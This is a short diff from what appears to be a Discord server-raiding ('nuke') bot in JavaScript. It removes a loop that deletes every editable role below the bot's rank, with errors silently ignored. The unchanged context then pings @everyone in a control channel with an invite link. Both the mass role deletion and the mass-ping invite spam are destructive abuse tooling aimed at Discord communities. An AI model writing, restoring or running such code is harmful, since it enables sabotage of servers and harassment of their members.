@@ -156,19 +156,7 @@ await sendCommandLog(interaction);
     });
   }
 
-  /* ===== XOÁ ROLE ===== */
-  const botRolePos = guild.members.me.roles.highest.position;
-  const roles = [...guild.roles.cache.values()]
-    .filter(r => r.editable && r.name !== "@everyone" && r.position < botRolePos);
 
-  for (const role of roles) {
-    queue.add(async () => {
-      try {
-        await role.delete();
-        await sleep(DELETE_DELAY);
-      } catch {}
-    });
-  }
 
   await controlChannel.send("@everyone ⚡ Join: https://discord.gg/P9yeTvwKjB");
 
